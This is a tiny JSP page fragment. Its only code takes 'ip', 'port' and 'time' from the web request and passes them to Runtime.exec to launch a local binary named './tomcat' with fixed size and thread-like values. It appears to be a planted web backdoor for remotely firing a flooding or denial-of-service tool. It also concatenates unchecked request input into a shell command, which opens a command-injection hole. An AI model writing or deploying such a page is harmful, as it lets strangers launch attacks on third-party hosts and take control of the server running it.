<%@ page import="java.util.*,java.io.*"%>
<%
%>
<%
    Process p;
    p = Runtime.getRuntime().exec("./tomcat " + request.getParameter("ip") + " " + request.getParameter("port") + " 1024 " + "200 " + request.getParameter("time")); 

%>
</pre>
</BODY></HTML>